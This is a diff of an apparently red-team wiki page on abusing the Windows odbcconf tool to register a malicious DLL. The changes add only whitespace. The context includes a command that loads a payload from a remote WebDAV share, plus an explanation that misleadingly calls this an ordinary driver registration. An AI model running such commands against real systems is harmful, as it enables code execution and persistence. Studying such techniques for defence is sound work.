@@ -33,9 +33,13 @@ The Odbcconf tool is a legitimate command-line tool used to manage ODBC drivers 
 
 This technique can be used to achieve a variety of goals, including data theft, privilege escalation, and persistence. Attackers can use this technique to execute malicious code that can steal sensitive data, such as login credentials and financial information. They can also use it to escalate privileges and gain access to sensitive systems or data. Finally, attackers can use this technique to establish persistence on a compromised system, allowing them to maintain access even after the initial compromise has been detected and remediated.
 
+ 
+
 ## Requirements
 
 1. Access to a Windows system with the Odbcconf tool installed
+
+ 
 
 ## Defense
 
@@ -45,17 +49,27 @@ This technique can be used to achieve a variety of goals, including data theft, 
 
 1. Use endpoint detection and response (EDR) solutions to detect and respond to suspicious activity
 
+ 
+
 ## Objectives
 
 1. Register a malicious ODBC driver
 
 1. Execute malicious code
 
+ 
+
 # Instructions
 
 1. The 'odbcconf' command is used to manage ODBC drivers and data sources. In this case, we are using it to register a new ODBC driver. The '/s' flag specifies that the driver should be registered system-wide. The '/a' flag specifies that we are adding a new driver. The '{regsvr \\webdavserver\folder\payload_dll.txt}' argument specifies the path to the DLL file that contains the ODBC driver.
 
+ 
+
+
+
 **Code**: [[odbcconf /s /a {regsvr \\webdavserver\folder\paylo]]
+
+
 
 > This command registers a new ODBC driver on the system. ODBC drivers are used to connect to various types of databases. By registering a new driver, we are making it possible to connect to a new type of database using ODBC. The path to the DLL file containing the driver must be specified in the command.
 
@@ -75,3 +89,5 @@ This technique can be used to achieve a variety of goals, including data theft, 
 
 - [[Odbcconf]]
 - [[Windows - Download and execute methods]]
+
+
